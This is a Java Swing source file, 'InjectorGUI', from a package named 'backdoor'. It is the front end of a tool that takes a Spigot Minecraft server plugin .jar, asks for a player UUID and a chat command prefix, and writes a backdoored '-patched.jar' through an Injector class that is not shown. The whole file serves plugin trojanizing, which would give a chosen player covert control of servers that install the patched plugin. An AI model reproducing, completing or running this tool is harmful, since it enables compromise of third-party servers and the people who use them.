package com.thiccindustries.backdoor;

import javax.swing.*;
import javax.swing.filechooser.FileFilter;
import java.io.File;

public class InjectorGUI{

    public static void main(String[] args){
        try {
            UIManager.setLookAndFeel(UIManager.getLookAndFeel());
        }catch(Throwable ignored){}

        /*--- Get Files ---*/

        JFileChooser fc = new JFileChooser();
        fc.setFileFilter(new FileFilter() {
            @Override
            public boolean accept(File file) {
                return file.getName().endsWith(".jar") || file.isDirectory();
            }

            @Override
            public String getDescription() {
                return "Spigot Plugin File (*.jar)";
            }
        });

        int result = fc.showOpenDialog(null);

        //Out dialog cancelled
        if(result != JFileChooser.APPROVE_OPTION)
            return;

        String InPath = fc.getSelectedFile().getPath();

        int sep = InPath.lastIndexOf(".");
        String OutPath = InPath.substring(0, sep) + "-patched.jar";

        /*--- Query options ---*/
        String UUIDList;
        String ChatPrefix;

        UUIDList = (String)JOptionPane.showInputDialog(
                null,
                "Minecraft UUID:",
                "Thicc Industries Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                ""
        );

        //No input
        if(UUIDList.isEmpty())
            return;

        ChatPrefix = (String)JOptionPane.showInputDialog(
                null,
                "Chat Command Prefix:",
                "Thicc Industries Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                "#"
        );

        //No input
        if(ChatPrefix.isEmpty())
            return;

        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDList, ChatPrefix);
        Injector.patchFile(InPath, OutPath, sc);
    }

    public static void displayError(String message){
        JOptionPane.showMessageDialog(null, message, "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
    }
}
